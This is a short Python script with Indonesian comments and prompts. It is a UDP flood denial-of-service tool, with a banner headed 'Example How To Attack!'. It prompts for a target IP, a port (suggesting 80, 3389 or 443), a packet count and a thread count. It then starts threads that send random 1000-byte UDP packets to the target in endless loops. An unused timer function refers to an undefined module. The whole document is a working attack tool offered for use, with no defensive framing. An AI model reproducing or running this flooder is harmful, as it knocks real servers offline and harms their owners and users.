# Random banget ngab
# Gabut buat cront
#credit by cront untuk remake

# Import Module
import socket
import random
import threading


print("TETAP LAH BANGUNKAN DIRI MU DAN STAY KUAT WALAU DIA TELAH MENINGGALKAN MU:>")


print("╔══════════════════════════════════╗")
print("║ Example How To Attack!           ║")
print("║ 1. Cantumkan IP Target Yang Anda Inginkan!   ║")
print("║ 2. Kemudian Letakkan Port 80/3389/443!║")
print("║ 3. Setelah Itu Letakkan Paket Yang Anda Inginkan║")
print("║ 4. Masukkan Utas Berapa Banyak yang Anda Inginkan!║")
print("║ 5. Kemudian Masuk Dan Berhasil !  ║")
print("╚══════════════════════════════════╝")

ip = str(input("[+] MASUKAN IP: "))
port = int(input("[+] MASUKAN PORT   : "))
times = int(input("[+] PAKET (BEBAS BANG PAKET SEMAUNYA) : "))
threads = int(input("[+] ONGKOS (BEBAS BANG SEMAU LU) : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" TERKIRIM")
        except socket.error:
            s.close()
            print("[!] dikirim siap untuk tembos sialan => ",ip," Dengan port : ",port,"!")
            
def timer(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)
			
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
    